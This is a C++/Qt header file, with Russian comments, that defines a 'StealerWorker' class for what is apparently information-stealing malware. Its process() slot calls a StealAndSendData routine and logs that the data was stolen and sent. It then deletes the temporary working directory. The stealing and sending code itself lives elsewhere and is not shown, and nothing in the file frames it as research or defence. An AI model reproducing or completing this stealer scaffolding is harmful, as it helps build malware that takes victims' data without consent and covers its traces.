#ifndef STEALERWORKER_H
#define STEALERWORKER_H

#include <QObject>
#include <QDebug>         // Для qDebug и qWarning
#include <exception>      // Для std::exception
#include <filesystem>     // Для std::filesystem
#include "mainwindow.h"   // Для MainWindow

class StealerWorker : public QObject {
    Q_OBJECT
public:
    explicit StealerWorker(MainWindow* window, const std::string& tempDir, QObject* parent = nullptr)
        : QObject(parent), window(window), tempDir(tempDir) {
        if (!window) {
            qWarning("StealerWorker: MainWindow pointer is null");
        }
    }

public slots:
    void process() {
        if (!window) {
            qWarning("StealerWorker: Cannot process, MainWindow is null");
            emit finished();
            return;
        }

        try {
            std::string processResult = window->StealAndSendData(tempDir); // Переименована переменная
            qDebug("StealerWorker: Data stealing and sending completed successfully");
            emit result(QString::fromStdString(processResult)); // Отправляем результат через сигнал
        } catch (const std::exception& e) {
            qWarning("StealerWorker: Exception during data stealing: %s", e.what());
            emit result("Ошибка: " + QString::fromStdString(e.what())); // Отправляем ошибку
        }

        // Очистка временной директории после завершения
        std::error_code ec;
        std::filesystem::remove_all(tempDir, ec);
        if (ec) {
            qWarning("StealerWorker: Failed to remove temp directory %s: %s", 
                     tempDir.c_str(), ec.message().c_str());
            emit result("Ошибка удаления временной директории: " + QString::fromStdString(ec.message()));
        } else {
            qDebug("StealerWorker: Temp directory %s removed", tempDir.c_str());
            emit result("Временная директория удалена: " + QString::fromStdString(tempDir));
        }

        emit finished();
    }

signals:
    void finished();
    void result(const QString& message); // Новый сигнал для передачи результата

private:
    MainWindow* window;
    std::string tempDir;
};

#endif // STEALERWORKER_H